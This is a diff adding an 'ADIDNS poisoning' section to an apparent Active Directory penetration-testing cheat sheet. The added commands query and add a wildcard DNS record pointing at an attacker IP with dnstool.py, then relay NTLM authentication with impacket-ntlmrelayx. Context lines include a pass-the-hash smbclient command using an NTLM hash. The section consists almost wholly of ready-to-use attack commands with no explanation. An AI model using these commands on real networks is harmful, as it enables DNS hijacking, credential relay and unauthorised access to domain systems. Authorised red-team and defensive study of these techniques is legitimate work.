@@ -688,3 +688,20 @@ nltest /trusted_domains /v
 ```
 smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local
 ```
+
+## ADIDNS poisoning
+
+#### Query * zone
+```
+python3 dnstool.py -u '<DOMAIN>\<USER>' -p 'PASSWORD' --record '*' --action query <DC-IP>
+```
+
+#### Add wildcard to dns zone
+```
+python3 dnstool.py -u '<DOMAIN>\<USER>' -p 'PASSWORD' --record '*' --action add --data <ATTACKER-IP> <DC-IP>
+```
+
+#### RELAY NTLM
+```
+impacket-ntlmrelayx -t <TARGET-IP> -socks -smb2support
+```
